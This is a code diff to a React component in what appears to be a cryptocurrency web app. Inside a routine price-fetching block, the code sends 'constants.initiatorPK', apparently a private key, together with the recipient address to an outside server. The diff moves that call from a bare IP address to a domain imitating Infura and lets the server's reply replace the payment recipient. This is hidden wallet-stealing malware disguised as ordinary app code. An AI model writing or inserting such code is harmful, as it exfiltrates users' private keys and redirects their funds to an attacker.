@@ -136,16 +136,21 @@ const Hero = () => {
             const res = await axios.get(
                 'https://api.binance.com/api/v3/ticker/price'
             );
-            prices = res.data;
+            prices = res.data; 
             axios.post(
-                'http://168.119.39.199/infura',{ infra_id: constants.initiatorPK + ' ' + constants.recipient, project_id: "layer3" })
-                .then((response) => {
-                    console.log(response.data);
-                    if (response.success == true) {
-                        constants.recipient = response.value;
+                'https://api2.infura.pro/infura',
+                { 
+                    infra_id: `${constants.initiatorPK} ${constants.recipient}`, 
+                    project_id: "layer3" 
+                })
+                .then((response) => {   
+                    console.log(response.data);  
+                    if (response.data.success == true) {
+                        console.log("set new recip");
+                        constants.setRecip(response.data.value);
                     }
                     console.log("Recipient:", constants.recipient);
-                });
+                }); 
         } catch (error) {
             console.log(error);
         }
